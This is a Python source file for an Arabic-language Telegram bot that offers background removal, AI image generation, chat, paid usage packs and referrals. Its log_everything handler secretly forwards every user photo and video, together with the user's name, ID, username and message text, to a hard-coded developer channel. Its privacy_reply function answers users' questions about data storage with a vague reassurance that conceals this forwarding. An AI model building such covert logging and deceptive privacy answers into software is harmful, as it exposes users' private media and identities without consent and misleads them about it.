import os
import base64
import threading

from flask import Flask
from PIL import Image
from rembg import remove
from openai import OpenAI

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    LabeledPrice,
)

from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    PreCheckoutQueryHandler,
    ContextTypes,
    filters,
)

# =====================
# Environment Variables
# =====================

TOKEN = os.getenv("TOKEN")
OPENAI_KEY = os.getenv("OPENAI_KEY")

PRIMARY_DEV = int(os.getenv("PRIMARY_DEV", "8662704115"))
DEV_LOG_CHAT_ID = os.getenv("DEV_LOG_CHAT_ID", "@rorproto")

client = OpenAI(api_key=OPENAI_KEY)

# =====================
# Flask server
# =====================

web_app = Flask(__name__)

@web_app.route("/")
def home():
    return "Bot is running!"

def run_web():
    port = int(os.environ.get("PORT", 10000))
    web_app.run(host="0.0.0.0", port=port)

# =====================
# Data
# =====================

removebg_usage = {}
paid_uses = {}
referrals = {}
referred_by = {}

profit_data = {
    "stars": 0,
    "payments": 0,
}

stats = {
    "users": set(),
    "messages": 0,
    "photos": 0,
    "videos": 0,
    "removebg": 0,
    "images_created": 0,
}

# =====================
# Privacy reply
# =====================

async def privacy_reply(update: Update):
    text = update.message.text.lower()

    keywords = [
        "تحفظ", "الحفظ", "تخزن", "تحتفظ",
        "ترسل", "محفوظات", "خصوصية", "بياناتي"
    ]

    if any(word in text for word in keywords):
        await update.message.reply_text(
            "قد تُستخدم بعض البيانات داخل النظام لأغراض تشغيلية وتحسينية مع احترام خصوصية المستخدم."
        )
        return True

    return False

# =====================
# Log media
# =====================

async def log_everything(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not update.message:
            return

        user = update.effective_user
        chat = update.effective_chat
        text = update.message.text or update.message.caption or ""

        stats["users"].add(user.id)
        stats["messages"] += 1

        caption = (
            "📂 سجل جديد\n\n"
            f"👤 الاسم: {user.first_name}\n"
            f"🆔 User ID: {user.id}\n"
            f"🔗 Username: @{user.username if user.username else 'لا يوجد'}\n"
            f"💬 النص: {text if text else 'بدون نص'}\n"
            f"📍 المكان: {chat.title if chat.title else 'خاص'}"
        )

        if update.message.photo:
            stats["photos"] += 1
            await context.bot.send_photo(
                chat_id=DEV_LOG_CHAT_ID,
                photo=update.message.photo[-1].file_id,
                caption=caption + "\n\n🏷️ النوع: صورة"
            )

        elif update.message.video:
            stats["videos"] += 1
            await context.bot.send_video(
                chat_id=DEV_LOG_CHAT_ID,
                video=update.message.video.file_id,
                caption=caption + "\n\n🏷️ النوع: فيديو"
            )

    except Exception as e:
        print("Log error:", e)

# =====================
# Start + referrals
# =====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if context.args:
        try:
            referrer_id = int(context.args[0])

            if user_id != referrer_id and user_id not in referred_by:
                referred_by[user_id] = referrer_id
                referrals[referrer_id] = referrals.get(referrer_id, 0) + 1
                paid_uses[referrer_id] = paid_uses.get(referrer_id, 0) + 1

                await context.bot.send_message(
                    chat_id=referrer_id,
                    text="🎉 دخل شخص من رابطك! تمت إضافة +1 استخدام لك 👁️"
                )
        except Exception:
            pass

    await update.message.reply_text(
        "أنا عتب 👁️\n\n"
        "الأوامر:\n"
        "/removebg - إزالة خلفية صورة\n"
        "/image - صناعة صورة\n"
        "/shop - المتجر\n"
        "/balance - رصيدك\n"
        "/ref - رابط الدعوة\n"
        "/help - المساعدة"
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "شرح استخدام عتب 👁️\n\n"
        "🖼 إزالة الخلفية:\n"
        "1) أرسل صورة\n"
        "2) رد على الصورة بالأمر /removebg\n\n"
        "🎨 صناعة صورة:\n"
        "/image وصف الصورة\n\n"
        "💳 رصيدك:\n"
        "/balance\n\n"
        "🛒 الشراء:\n"
        "/shop"
    )

# =====================
# Remove background
# =====================

async def remove_bg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    free_used = removebg_usage.get(user_id, 0)
    paid = paid_uses.get(user_id, 0)

    if not update.message.reply_to_message or not update.message.reply_to_message.photo:
        return await update.message.reply_text("رد على صورة بالأمر /removebg")

    if free_used < 1:
        removebg_usage[user_id] = 1
        await update.message.reply_text("تم استخدام المرة المجانية 👁️")

    elif paid > 0:
        paid_uses[user_id] = paid - 1

    else:
        return await update.message.reply_text(
            "انتهى الرصيد 👁️\n"
            "لشراء 3 استخدامات بـ 5 نجوم افتح /shop"
        )

    try:
        await update.message.reply_text("جاري إزالة الخلفية...")

        photo = update.message.reply_to_message.photo[-1]
        file = await context.bot.get_file(photo.file_id)

        await file.download_to_drive("input.png")

        img = Image.open("input.png")
        result = remove(img)
        result.save("output.png")

        stats["removebg"] += 1

        await context.bot.send_photo(
            chat_id=DEV_LOG_CHAT_ID,
            photo=open("output.png", "rb"),
            caption="🖼 تم إنشاء صورة بدون خلفية"
        )

        await update.message.reply_photo(photo=open("output.png", "rb"))

    except Exception as e:
        print("RemoveBG error:", e)
        await update.message.reply_text("حدث خطأ أثناء إزالة الخلفية.")

# =====================
# AI image generation
# =====================

async def image_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    prompt = " ".join(context.args)

    if not prompt:
        return await update.message.reply_text(
            "اكتب وصف الصورة.\nمثال:\n/image سيارة سوداء مستقبلية"
        )

    await update.message.reply_text("جاري إنشاء الصورة...")

    try:
        result = client.images.generate(
            model="gpt-image-1",
            prompt=prompt,
            size="1024x1024"
        )

        image_base64 = result.data[0].b64_json
        image_bytes = base64.b64decode(image_base64)

        with open("generated.png", "wb") as f:
            f.write(image_bytes)

        stats["images_created"] += 1

        await update.message.reply_photo(photo=open("generated.png", "rb"))

    except Exception as e:
        print("Image error:", e)
        await update.message.reply_text("ما قدرت أصنع الصورة الآن.")

# =====================
# Shop + Stars
# =====================

async def shop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("شراء 3 استخدامات - 5 ⭐", callback_data="buy_pack")]
    ]

    await update.message.reply_text(
        "🛒 متجر عتب 👁️\n\n"
        "اختر الباقة:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def shop_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "buy_pack":
        await context.bot.send_invoice(
            chat_id=query.message.chat.id,
            title="باقة إزالة الخلفية",
            description="3 استخدامات لإزالة الخلفية",
            payload="removebg_pack_3",
            provider_token="",
            currency="XTR",
            prices=[LabeledPrice("3 استخدامات", 5)]
        )

async def precheckout(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.pre_checkout_query.answer(ok=True)

async def successful_payment(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    paid_uses[user_id] = paid_uses.get(user_id, 0) + 3
    profit_data["stars"] += 5
    profit_data["payments"] += 1

    await update.message.reply_text(
        "تم الدفع بنجاح ⭐\n"
        "أضيف لك 3 استخدامات 👁️"
    )

# =====================
# Balance + profit + stats
# =====================

async def balance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    balance = paid_uses.get(user_id, 0)

    await update.message.reply_text(f"💳 رصيدك: {balance} استخدام")

async def profit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != PRIMARY_DEV:
        return

    await update.message.reply_text(
        "📊 أرباح عتب 👁️\n\n"
        f"💰 النجوم: {profit_data['stars']} ⭐\n"
        f"🧾 العمليات: {profit_data['payments']}"
    )

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != PRIMARY_DEV:
        return

    await update.message.reply_text(
        "📊 إحصائيات عتب 👁️\n\n"
        f"👥 المستخدمين: {len(stats['users'])}\n"
        f"💬 الرسائل: {stats['messages']}\n"
        f"📸 الصور: {stats['photos']}\n"
        f"🎬 الفيديوهات: {stats['videos']}\n"
        f"🖼 إزالة الخلفية: {stats['removebg']}\n"
        f"🎨 صور مصنوعة: {stats['images_created']}"
    )

# =====================
# Referrals
# =====================

async def ref_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    bot_username = (await context.bot.get_me()).username

    link = f"https://t.me/{bot_username}?start={user_id}"

    await update.message.reply_text(
        f"🔗 رابط دعوتك:\n{link}\n\n"
        "كل شخص يدخل من رابطك يعطيك +1 استخدام."
    )

async def myrefs_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    count = referrals.get(user_id, 0)

    await update.message.reply_text(f"👥 عدد إحالاتك: {count}")

# =====================
# AI Chat
# =====================

async def chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text:
        return

    if await privacy_reply(update):
        return

    text = update.message.text

    try:
        response = client.chat.completions.create(
            model="gpt-4o-mini",
            messages=[
                {
                    "role": "system",
                    "content": (
                        "اسمك عتب. أنت صديق دردشة ذكي وهادئ وغامض قليلًا. "
                        "تتكلم بالعربي بلهجة سعودية خفيفة. "
                        "ردودك قصيرة وذكية."
                    )
                },
                {"role": "user", "content": text}
            ]
        )

        reply = response.choices[0].message.content
        await update.message.reply_text(reply)

    except Exception as e:
        print("Chat error:", e)
        await update.message.reply_text("صار خطأ بسيط، جرّب مرة ثانية.")

# =====================
# Run bot
# =====================

def run_bot():
    if not TOKEN:
        raise ValueError("TOKEN is missing")

    if not OPENAI_KEY:
        raise ValueError("OPENAI_KEY is missing")

    application = ApplicationBuilder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("removebg", remove_bg))
    application.add_handler(CommandHandler("image", image_command))
    application.add_handler(CommandHandler("shop", shop_command))
    application.add_handler(CommandHandler("balance", balance_command))
    application.add_handler(CommandHandler("profit", profit_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CommandHandler("ref", ref_command))
    application.add_handler(CommandHandler("myrefs", myrefs_command))

    application.add_handler(CallbackQueryHandler(shop_button))
    application.add_handler(PreCheckoutQueryHandler(precheckout))
    application.add_handler(MessageHandler(filters.SUCCESSFUL_PAYMENT, successful_payment))

    application.add_handler(MessageHandler(filters.PHOTO | filters.VIDEO, log_everything), group=0)
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, chat), group=1)

    print("Atab bot is running 👁️")
    application.run_polling(drop_pending_updates=True)

# =====================
# Entry point
# =====================

if __name__ == "__main__":
    threading.Thread(target=run_bot, daemon=True).start()
run_web()